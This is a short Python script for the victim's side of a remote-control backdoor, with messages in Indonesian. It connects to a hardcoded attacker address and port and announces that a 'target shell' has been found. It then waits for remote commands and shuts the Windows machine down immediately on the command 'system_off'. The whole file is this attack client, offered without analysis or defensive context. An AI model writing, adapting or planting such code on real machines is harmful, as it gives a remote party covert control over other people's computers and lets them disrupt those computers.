import socket
import os

class Client:
    def __init__(self, rhost="192.168.18.162", rport=5000):
        self.rhost = rhost
        self.rport = rport
        self.cl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def runclient(self):
        self.cl.connect((self.rhost, self.rport))

        pesan = "[+] Shell target ditemukan!"
        self.cl.send(pesan.encode())

        while True:
            perintah = self.cl.recv(1024).decode()

            if perintah == "exit":
                break
            elif perintah == "system_off":
                os.system("shutdown -s -t 0")

if __name__ == "__main__":
    c = Client()
    c.runclient()
